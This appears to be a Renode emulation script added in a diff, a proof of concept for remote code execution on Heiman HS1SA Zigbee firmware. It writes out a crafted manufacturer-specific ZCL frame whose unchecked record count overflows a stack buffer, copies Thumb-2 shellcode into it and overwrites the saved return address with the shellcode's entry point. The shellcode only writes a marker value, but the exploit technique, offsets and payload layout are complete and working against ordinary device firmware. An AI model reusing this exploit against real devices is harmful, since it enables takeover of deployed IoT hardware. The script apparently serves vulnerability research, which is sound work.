@@ -1,0 +1,112 @@
+:name: ZB-06 HS1SA — FULL RCE (dispatch-injection -> sink overflow -> shellcode execution)
+:description: End-to-end RCE PoC on the real Heiman HS1SA (EFR32MG21, Cortex-M33) firmware. An already-decrypted plaintext manufacturer-specific ZCL frame is injected at the ZCL command dispatcher sub_7D46. The firmware's OWN code (sub_7D46 -> sub_7B5A -> gate sub_a33c -> sink sub_1662e) parses/routes it and the sink's unbounded record loop (payload[0x0a] records) both (a) copies attacker Thumb-2 shellcode into the sink's own stack buffer at 0x2000FF70 via its strh record loop AND (b) overwrites the sink's saved return address (0x2000FFB4) with the shellcode entry 0x2000FF71 (Thumb bit set). The sink's genuine epilogue `ldmia sp!,{...,pc}` @0x16736 then loads PC from the corrupted slot with NO forced PC, transferring control to the shellcode, which writes the magic 0xC0DE1337 to 0x20017000 and spins.
+#
+# SUCCESS CRITERION: after the run, ReadDoubleWord 0x20017000 == 0xC0DE1337 (the
+# firmware would NEVER write that there) and PC is parked inside the shellcode
+# region (0x2000FF70..0x2000FF83) -- reached with NO forced PC after the 0x7d46
+# injection ENTRY.
+#
+# NO FORCED PC AFTER INJECTION: PC is set exactly once, to the dispatcher entry
+# 0x7d46 (modelling the register/stack contract sub_C22C/sub_E376 would pass, and
+# bypassing only NWK/APS crypto + endpoint affinity -- the same "joined device"
+# scaffolding as zb06_dispatch_inject.resc). Every subsequent PC value, including
+# the pop into the shellcode, is produced by the firmware's own instructions.
+# All AddHook are OBSERVE-ONLY (ErrorLog); none set PC.
+
+include @scripts/silabs-vuln/hs1sa.resc
+logLevel 3
+logLevel 3 sysbus.radio
+
+# COLD observe-only markers along the firmware's own dispatch path.
+cpu AddHook 0x7d46  "self.ErrorLog('MARK_7D46_ZCLDISP')"
+cpu AddHook 0x7b5a  "self.ErrorLog('MARK_7B5A')"
+cpu AddHook 0xa33c  "self.ErrorLog('MARK_A33C_GATE')"
+cpu AddHook 0x1662e "self.ErrorLog('MARK_1662E_SINK')"
+# Natural epilogue pop that consumes the corrupted saved-LR slot.
+cpu AddHook 0x16736 "self.ErrorLog('MARK_16736_EPILOGUE_POP')"
+# Shellcode entry (observe-only). Fires when the firmware's own pop lands here.
+cpu AddHook 0x2000ff70 "self.ErrorLog('SHELLCODE EXECUTING @0x2000FF70')"
+
+# Boot through clock/power/radio bring-up.
+emulation RunFor "0.05"
+pause
+echo ">>> post-boot PC (expect advanced, e.g. ~0x12e10):"
+cpu PC
+
+# --- Craft the PLAINTEXT manufacturer-specific ZCL frame in scratch RAM ---------------
+python "for a in range(0x20008000,0x200080A0,4): monitor.Machine.SystemBus.WriteDoubleWord(a,0)"
+python "monitor.Machine.SystemBus.WriteDoubleWord(0x20009000,0)"
+python "monitor.Machine.SystemBus.WriteDoubleWord(0x20009004,0)"
+
+# ZCL frame @0x20008003 (frame_ptr = r2):
+#   [0]=FC=0x05  [1..2]=mfgCode 0x120B  [3]=TSN=0x00  [4]=cmdId=0xF3
+sysbus WriteByte 0x20008003 0x05
+sysbus WriteDoubleWord 0x20008004 0xF300120B
+
+# --- Sink command body (payload_ptr = frame+5 = 0x20008008) ---------------------------
+#   payload[0x08]=0x01 outer segment count (<5), payload[0x09]=0x00 control byte,
+#   payload[0x0a]=0x28=40 UNCLAMPED inner record count.
+#   Records sl=0..9 carry the 10 Thumb-2 shellcode halfwords -> the firmware's own
+#   strh loop writes them into its stack buffer at 0x2000FF70.
+#   Records 34/35 carry the saved-LR target 0x2000FF71 (shellcode entry | Thumb bit).
+# payload base P=0x20008008.
+#   [0x08]=0x01 outer count (<5)  [0x09]=0x00 control byte  [0x0a]=0x28=40 record count
+sysbus WriteByte 0x20008010 0x01
+sysbus WriteByte 0x20008011 0x00
+sysbus WriteByte 0x20008012 0x28
+# shellcode halfwords (little-endian instruction stream) written by the firmware's
+# own strh record loop into its stack buffer @0x2000FF70:
+#   f241 3037  movw r0,#0x1337
+#   f2cc 00de  movt r0,#0xc0de
+#   f247 0100  movw r1,#0x7000
+#   f2c2 0101  movt r1,#0x2001
+#   6008       str  r0,[r1]
+#   e7fe       b .
+# record sl uses payload[11+2sl]=hw>>8 (high), payload[12+2sl]=hw&0xff (low).
+python "hw=[0xf241,0x3037,0xf2cc,0x00de,0xf247,0x0100,0xf2c2,0x0101,0x6008,0xe7fe]"
+python "sb=monitor.Machine.SystemBus"
+python "[ (sb.WriteByte(0x20008008+11+2*i,(hw[i]>>8)&0xff), sb.WriteByte(0x20008008+12+2*i,hw[i]&0xff)) for i in range(10) ]"
+# saved-LR records 34/35 -> 0x2000FF71 (shellcode entry | Thumb bit)
+sysbus WriteByte 0x20008057 0xFF
+sysbus WriteByte 0x20008058 0x71
+sysbus WriteByte 0x20008059 0x20
+sysbus WriteByte 0x2000805A 0x00
+
+# sub_7D46 incoming stack args (read at [sp+0x30]/[sp+0x34]) -> zero.
+sysbus WriteDoubleWord 0x20010030 0x00000000
+sysbus WriteDoubleWord 0x20010034 0x00000000
+
+# Sentinel in the saved-LR slot the sink will overwrite.
+sysbus WriteDoubleWord 0x2000FFB4 0xAABBCCDD
+
+# Magic target: pre-set to a sentinel so the change is unambiguous.
+sysbus WriteDoubleWord 0x20017000 0xDEADBEEF
+
+echo ">>> BEFORE: saved-LR slot @0x2000FFB4 (sentinel) ="
+sysbus ReadDoubleWord 0x2000FFB4
+echo ">>> BEFORE: magic slot @0x20017000 (sentinel 0xDEADBEEF) ="
+sysbus ReadDoubleWord 0x20017000
+
+# --- Register contract sub_C22C/sub_E376 would hand sub_7D46 (the ONE forced PC) -----
+sysbus.cpu SetRegister 0  0x20009000
+sysbus.cpu SetRegister 1  0x00000000
+sysbus.cpu SetRegister 2  0x20008003
+sysbus.cpu SetRegister 3  0x00000060
+sysbus.cpu SetRegister 13 0x20010000
+sysbus.cpu SetRegister 14 0x0000DEAD
+sysbus.cpu PC 0x7d46
+
+# Let the firmware's OWN dispatch carry the frame down, overflow, pop the corrupted
+# LR, and run the shellcode (which spins at 0x2000FF70, so the window is safe).
+emulation RunFor "0.002"
+pause
+
+echo ">>> AFTER: PC (expect inside shellcode 0x2000FF70..0x2000FF83) ="
+cpu PC
+echo ">>> AFTER: saved-LR slot @0x2000FFB4 (expect 0x2000FF71) ="
+sysbus ReadDoubleWord 0x2000FFB4
+echo ">>> AFTER: magic slot @0x20017000 (expect 0xC0DE1337) ="
+sysbus ReadDoubleWord 0x20017000
+echo ">>> shellcode bytes copied into stack buffer @0x2000FF70 (expect 41 f2 37 30 ...) ="
+sysbus ReadDoubleWord 0x2000FF70
+quit
